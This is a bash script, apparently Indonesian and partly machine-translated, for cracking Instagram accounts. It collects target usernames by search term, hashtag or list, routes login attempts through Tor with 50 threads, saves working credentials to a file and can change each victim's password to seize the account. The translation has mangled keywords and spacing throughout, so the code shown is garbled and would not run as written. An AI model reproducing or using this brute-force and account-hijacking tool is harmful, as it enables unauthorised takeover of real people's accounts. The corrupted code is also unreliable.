#! / bin / bash
# Penulis: ./Lolz
# Terima kasih kepada: JavaGhost - Bashid.org
# Recode tinggal recode aja okeh, tapi sumber cantumin lah tolol
# Yamaap jika scriptnya acak "an :(

# warna (tebal)
red = '\ e [1; 31m'
green = '\ e [1; 32m'
kuning = '\ e [1; 33m'
blue = '\ e [1; 34m'
magenta = '\ e [1; 35m'
cyan = '\ e [1; 36m'
white = '\ e [1; 37m'

# Mulailah
# trap
menjebak ctrl_c INT

# Jika pengguna mengklik ctrl + c = program berhenti dan hapus semua file tmp di dir multiBF_ig
function ctrl_c () {
	jika [[! -e * .tmp *]]; kemudian
		echo -e "$ {white}"
	lain
		echo -e "$ {white}"
		rm * .tmp *
	fi
}

# dependensi
dependensi = ("jq" "curl" "tor")
untuk depen dalam "$ {dependencies [@]}"
melakukan
    perintah -v $ i> / dev / null 2> & 1 || {
        echo -e> & 2 "$ {white} [$ {red} STOPPED $ {white}] $ {red} - $ {white} paket $ {green} $ {depen} $ {white} tidak terpasang! $ {red} - $ {white} install dengan mengetikkan perintah $ {red}: $ {white} apt install $ i -y "
        keluar
    }
selesai

# memeriksa jalankan tor
check_tor = $ (curl --socks5-hostname localhost: 9050 -s "https://www.google.com"> / dev / null; echo $?)
if [[$ check_tor -gt 0]]; kemudian
	echo -e "$ {white} [$ {red} ERROR $ {white}] TOR tidak berjalan! $ {red} - $ {white} jalankan dengan tipe $ {red} '$ {green} tor $ {red}' $ {white} di terminal Anda "
	keluar
fi

# buat file
sentuh target.tmp user.tmp unknown.tmp

# banner + menu
gema -e '' '
      \ e [1; 37m _ __ _ 
      \ e [1; 37m__ | _ | _ o | _) | _ o (_ |
      \ e [1; 37m |||| _ | | | _ | | _) | ___ | __ |
   \ e [1; 37m [\ e [1; 31m Kontak \ e [1; 31m: \ e [1; 34m WA. 085896866716\e[1;37m]

1 \ e [1; 31m. \ e [1; 37mDapatkan \ e [1; 31m + \ e [1; 37mcrack target dari spesifik \ e [1; 32m @ nama pengguna \ e [1; 37m
2 \ e [1; 31m. \ e [1; 37mDapatkan \ e [1; 31m + \ e [1; 37mcrack target dari spesifik \ e [1; 32m @ hashtag \ e [1; 37m
3 \ e [1; 31m. \ e [1; 37mCrack target dari daftar target \ e [1; 37m
''

# meminta
echo -ne "$ {white} [$ {red}? $ {white}] Pilih yang Anda inginkan, $ {red}: $ {green}"; baca ask_menu

# pilih menu
case $ ask_menu masuk
	1) # menu 1
		echo -e "\ n $ {white} [$ {red} CATATAN $ {white}] $ {red}: $ {white} Berikan ruang untuk mencari lebih dari 1 pengguna $ {red} [$ {white} contoh $ {red}: $ {white} user1 user2 $ {red}] $ {white} "
		echo -ne "$ {white} [$ {red}? $ {white}] Masukkan nama pengguna spesifik $ {red}: $ {green}"; baca ask_user && echo $ ask_user | tr "" "\ n"> username.tmp
		untuk get_user dalam $ (cat username.tmp); melakukan
			get_list_user = $ (curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${get_user}" | jq -r '.users []. user.username' >> >> target.tmp)
		selesai
		echo -e "$ {white} [$ {red} + $ {white}] Ditemukan $ {red}: $ {green} $ (<target.tmp wc -l) pengguna $ {white} dengan pengguna $ {red} : $ {green} $ {ask_user} $ {white} "
		echo -ne "$ {white} [$ {red}? $ {white}] Kata sandi untuk menggunakan $ {red}: $ {green}"; baca ask_pass && echo $ ask_pass | tr "" "\ n" >> wordlist.tmp
		echo -e "$ {white} [$ {green} INFO $ {white}] - Mulai cracking \ e [4m $ {green} $ (<target.tmp wc -l) $ {white} \ e [pengguna 0m menggunakan pass $ {red}: $ {green} \ e [4m $ {ask_pass} $ {white} \ e [0m \ n "
		;;
	2) # menu 2
		echo -ne "\ n $ {white} [$ {red}? $ {white}] Masukkan hashtag spesifik $ {red}: $ {green}"; baca ask_tag
		get_list_user = $ (curl -sXGET "https://www.instagram.com/explore/tags/${ask_tag}/?__a=1")
		if [[$ get_list_user = ~ "Page Not Found"]]; kemudian
			echo -e "$ {white} [$ {red} - $ {white}] Hashtag $ {red}: $ {green} $ {ask_tag} $ {red} - $ {white} Tidak ditemukan"
			keluar
		lain
			echo $ get_list_user | jq -r '. []. hashtag.edge_hashtag_to_media.edges []. node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}'> user.tmp
			untuk tag_user dalam $ (cat user.tmp); melakukan
                echo $ tag_user | xargs -P 100 curl -s | grep -o "alternateName. *" | cut -d "@" -f2 | cut -d '"' -f1 >> target.tmp &
            selesai
            Tunggu
            echo -e "$ {white} [$ {red}! $ {white}] Harap tunggu ..."
			echo -e "$ {white} [$ {red}! $ {white}] Menghapus duplikat pengguna $ (sort -u user.tmp -o user.tmp)"
			echo -e "$ {white} [$ {red} + $ {white}] Ditemukan $ {red}: $ {green} $ (<target.tmp wc -l) pengguna dalam tagar $ {red}: $ {green } $ {ask_tag} $ {white} "
			echo -ne "$ {white} [$ {red}? $ {white}] Kata sandi untuk menggunakan $ {red}: $ {green}"; baca ask_pass && echo $ ask_pass | tr "" "\ n" >> wordlist.tmp
			echo -e "$ {white} [$ {green} INFO $ {white}] $ {red} - $ {white} Mulai cracking \ e [4m $ {green} $ (<target.tmp wc -l) $ { white} \ e [0m pengguna menggunakan pass $ {red}: $ {green} \ e [4m $ {ask_pass} $ {white} \ e [0m \ n "
		fi
		;;
	3) # menu 3
		echo -ne "$ {white} [$ {red}? $ {white}] Input target nama pengguna $ {red}: $ {green}"; baca ask_list
		jika [[! -e $ ask_list]]; kemudian
			echo -e "$ {white} [$ {red}! $ {white}] $ {red} Daftar tidak ditemukan di direktori Anda $ {white}"
		lain
			cat $ ask_list> target.tmp
			echo -ne "$ {white} [$ {red}? $ {white}] Kata sandi untuk menggunakan $ {red}: $ {green}"; baca ask_pass && echo $ ask_pass | tr "" "\ n" >> wordlist.tmp
			echo -e "$ {white} [$ {green} INFO $ {white}] $ {red} - $ {white} Mulai cracking \ e [4m $ {green} $ (<target.tmp wc -l) $ { white} \ e [0m pengguna menggunakan pass $ {red}: $ {green} \ e [4m $ {ask_pass} $ {white} \ e [0m \ n "
		fi
		;;
	*) # menu salah
		echo -e "$ {white} [$ {red} ERROR $ {white}] $ {red}: $ {white} Opsi tidak ada pada menu boy ..."
		tidur 2
		bersih
		bash brute.sh
		;;
esac

# ubah kata sandi setelah kekerasan [jika berhasil]
function change_password () {
	csrftoken = $ (curl -sL -sXGET -b Cookies _ $ {user} .tmp --url "https://www.instagram.com" -H "agen pengguna: Mozilla / 5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build / MMB29M) AppleWebKit / 537.36 (KHTML, seperti Gecko) SamsungBrowser / 4.0 Chrome / 44.0.2403.133 Mobile Safari / 537.36 "| grep -o" csrf_token. * "| Cut -d '" -f3)
	ubah = $ (curl -sL -sXPOST -b Cookies _ $ {user} .tmp --url "https://www.instagram.com/accounts/password/change/" \
					-H "agen pengguna: Mozilla / 5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build / MMB29M) AppleWebKit / 537.36 (KHTML, seperti Gecko) SamsungBrowser / 4.0 Chrome / 44.0.2403.133 Mobile Safari / 537.36" \
					-H "x-csrftoken: $ {csrftoken}" \
					-d "old_password = $ {pass} & new_password1 = $ {ask_new_pass} & new_password2 = $ {ask_new_pass}" | jq -r '.status')
					if [[$ change == "ok"]]; kemudian
						echo -e "$ {white} [$ {red} + $ {white}] Pengguna $ {red}: $ {green} @ $ {user} $ {red} - $ {white} Perubahan sukses beralih ke $ {red }: $ {green} $ {ask_new_pass} $ {white} "
					lain
						echo -e "$ {white} [$ {red} FAILED CHANGE LULUS $ {white}] $ {red} - $ {white} @ $ {user} $ {red}: $ {white} $ {ask_new_pass} $ { red} - $ {white} Kontak $ {red}: $ {blue} https://fb.me/n00b.me${white} "
					fi
}

# meminta pass perubahan
echo -ne "$ {white} [$ {red}? $ {white}] Apakah Anda ingin pass perubahan otomatis setelah mendapat akun $ {red} ($ {white} y / n $ {red}) $ {white} $ {red}: $ {green} "; baca ask_change_pass
if [[$ ask_change_pass == "Y" || $ ask_change_pass == "y"]]; kemudian
	echo -ne "$ {white} [$ {red}? $ {white}] Masukkan pass baru $ {red}: $ {green}"; baca ask_new_pass
	gema ""
elif [[$ ask_change_pass == "N" || $ ask_change_pass == "n"]]; kemudian
	gema ""
fi

# Gabung
function brute_force () {
	# Mulai brute force
	token = $ (curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken =. *" | cut -d "=" -f2 | cut -d "; "-f1)
	login = $ (curl -sc Cookies _ $ {user} .tmp -XPOST "https://www.instagram.com/accounts/login/ajax/" \
					-H "cookie: csrftoken = $ {token}" \
					-H "asal: https://www.instagram.com" \
					-H "referer: https://www.instagram.com/accounts/login/" \
					-H "agen pengguna: Mozilla / 5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build / MMB29M) AppleWebKit / 537.36 (KHTML, seperti Gecko) SamsungBrowser / 4.0 Chrome / 44.0.2403.133 Mobile Safari / 537.36" \
					-H "x-csrftoken: $ {token}" \
					-H "x-diminta-dengan: XMLHttpRequest" \
					-d "username = $ {user} & password = $ {pass}"); true_login = $ (echo $ login | jq -r '.authenticated')
  					if [[$ true_login = ~ "true"]]; kemudian
  						pengikut lokal = $ (curl -sXGET "https://instagram.com/${user}/" -L | grep -o '<meta property = "og: description" content = ". *' | cut -d ' "'-f4 | cut -d" "-f1)
  						echo -e "$ {white} [$ {green} MENDAPAT ACCOUNT $ {white}] $ {red} - $ {white} @ $ {user} $ {red}: $ {white} $ {pass} $ {red }: $ {green} $ {followers} $ {white} Pengikut "
  						echo "$ {user}: $ {pass}" >> account_success_crack.txt
						if [[$ ask_change_pass == "Y" || $ ask_change_pass == "y"]]; kemudian
							ganti kata sandi
	  						echo "$ {user}: $ {pass}" >> account_success_crack.txt
						fi
						killall -HUP untuk
  					elif [[$ login = ~ "checkpoint_required"]]; kemudian
  						echo -e "$ {white} [$ {cyan} CHECKPOINT $ {white}] $ {red} - $ {white} @ $ {user} $ {red}: $ {white} $ {pass}"
						killall -HUP untuk
  					elif [[$ login = ~ "false"]]; kemudian
  						echo -e "$ {white} [$ {red} GAGAL UNTUK RETAK $ {white}] $ {red} - $ {white} @ $ {user} $ {red}: $ {white} $ {pass}"
  						killall -HUP untuk
  					lain
  						echo -e "$ {white} [$ {yellow} UNKNOWN ERROR $ {white}] $ {red} $ {white} - @ $ {user} $ {red}: $ {white} $ {pass}"
  						killall -HUP untuk
  					fi
}

# multithread
(
	LIMIT = "50" # utas
	untuk pengguna dalam $ (cat target.tmp); melakukan
		untuk lulus $ (cat wordlist.tmp); melakukan
			((utas = utas% LIMIT)); ((utas ++ == 0)) && tunggu
			brute_force "$ user" &
		selesai
	selesai
	Tunggu
)

# Cek punya akun atau tidak
jika [[! -e account_success_crack.txt]]; kemudian
	echo -e "$ {white} \ n [$ {red}! $ {white}] Anda tidak mendapatkan akun boy :("
lain
	echo -e "$ {white} [$ {red} + $ {white}] Anda mendapat $ {red}: $ {green} $ (<account_success_crack.txt wc-l) akun instagram $ {white}"
fi

# meminta lari lagi atau tidak
echo -ne "$ {white} [$ {red}? $ {white}] Ingin bermain denganku lagi nak $ {red} ($ {white} y / n $ {red}): $ {green}"; baca ask_again
if [[$ ask_again == "Y" || $ ask_again == "y"]]; kemudian
	echo -e "$ {white} [$ {red} + $ {white}] Oke bagus! mari kita coba lagi boy XD"
	bash brute.sh
elif [[$ ask_again == "N" || $ ask_again == "n"]]; kemudian
	echo -e "$ {white} [$ {red} + $ {white}] See u boy: *"
	rm * .tmp *
lain
	rm * .tmp *
fi
# end